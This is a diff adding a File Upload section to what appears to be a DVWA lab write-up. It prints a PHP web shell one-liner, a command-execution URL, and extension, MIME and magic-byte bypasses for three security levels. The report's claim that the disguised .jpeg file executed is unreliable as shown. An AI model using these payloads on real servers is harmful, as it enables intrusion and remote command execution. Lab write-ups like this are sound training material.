@@ -555,3 +555,154 @@ At High security level, DVWA attempts to restrict file inclusion by validating t
 Category:
 
 Security Misconfiguration (OWASP Top 10 A05:2021)
+
+## File Upload
+
+Description:
+
+File Upload vulnerabilities occur when a web application allows users to upload files without properly validating the file type or content. Attackers can exploit this weakness by uploading malicious scripts such as web shells, which may allow remote command execution on the server.
+
+---
+
+### Security Level: Low
+
+Payload Used:
+
+A simple PHP web shell file.
+
+Example file: `shell.php`
+
+```
+<?php system($_GET['cmd']); ?>
+```
+
+Steps Performed:
+
+1. Navigate to **DVWA → File Upload**.
+2. Set DVWA Security Level to **Low**.
+3. Create a PHP shell file named `shell.php`.
+4. Upload the file using the upload form.
+5. Access the uploaded file through the browser.
+
+Example access URL:
+
+```
+http://127.0.0.1:8080/hackable/uploads/shell.php?cmd=ls
+```
+
+Result:
+
+The uploaded PHP shell executed successfully and allowed system commands to be run from the browser.
+
+Screenshot:
+
+![File Upload Low](screenshots/file-upload-low.png)
+
+Explanation (Why it Worked):
+
+At Low security level, DVWA does not perform any validation on uploaded files. This allows attackers to upload executable PHP scripts directly to the server and execute them remotely.
+
+---
+
+### Security Level: Medium
+
+Payload Used:
+
+A PHP shell file disguised as an image.
+
+Example filename:
+
+```
+shell.php.jpg
+```
+
+Steps Performed:
+
+1. Navigate to **DVWA → File Upload**.
+2. Set DVWA Security Level to **Medium**.
+3. Rename the malicious file to `shell.php.jpg`.
+4. Upload the file through the upload form.
+
+Result:
+
+The file upload succeeded because the application only checked the file extension superficially.
+
+Screenshot:
+
+![File Upload Medium](screenshots/file-upload-medium.png)
+
+Explanation (Why it Worked):
+
+At Medium security level, DVWA attempts to restrict uploads by checking the file extension. However, the validation is weak and can be bypassed by disguising the PHP file with an allowed extension such as `.jpg`.
+
+---
+
+### Security Level: High
+
+Payload Used:
+
+A PHP shell file with a manipulated MIME type and disguised filename.
+
+Example file content:
+
+```
+GIF89a;
+<?php system($_GET['cmd']); ?>
+```
+
+Filename used in the request:
+
+```
+shell.php.jpeg
+```
+
+Steps Performed:
+
+1. Navigate to **DVWA → File Upload**.
+2. Set DVWA Security Level to **High**.
+3. Intercept the file upload request using **Burp Suite**.
+4. Modify the request to use the filename `shell.php.jpeg`.
+5. Change the `Content-Type` header of the file upload request:
+
+```
+Content-Type: image/jpeg
+```
+
+6. Forward the modified request to the server.
+
+Result:
+
+The malicious PHP file was successfully uploaded and executed despite the file type restrictions.
+
+Screenshot:
+
+![File Upload High](screenshots/file-upload-high.png)
+![File Upload High](screenshots/file-upload-high1.png)
+
+Explanation (Why it Worked):
+
+At High security level, DVWA validates both the file extension and MIME type.  
+
+- Adding `.jpeg` to the filename bypasses the extension check.  
+- Changing the `Content-Type` header to `image/jpeg` bypasses MIME type validation.  
+- Prepending `GIF89a;` to the file content tricks the server into recognizing it as a valid image.  
+
+This allows the PHP code to be uploaded and executed on the server despite the high-level protections.
+
+---
+
+### Security Comparison
+
+| Security Level | Attack Success | Reason |
+|----------------|---------------|-------|
+| Low | Successful | No file validation |
+| Medium | Successful | File extension bypass |
+| High | Successful | MIME type manipulation |
+
+---
+
+### OWASP Top 10 Mapping
+
+Category:
+
+Security Misconfiguration (OWASP Top 10 A05:2021)
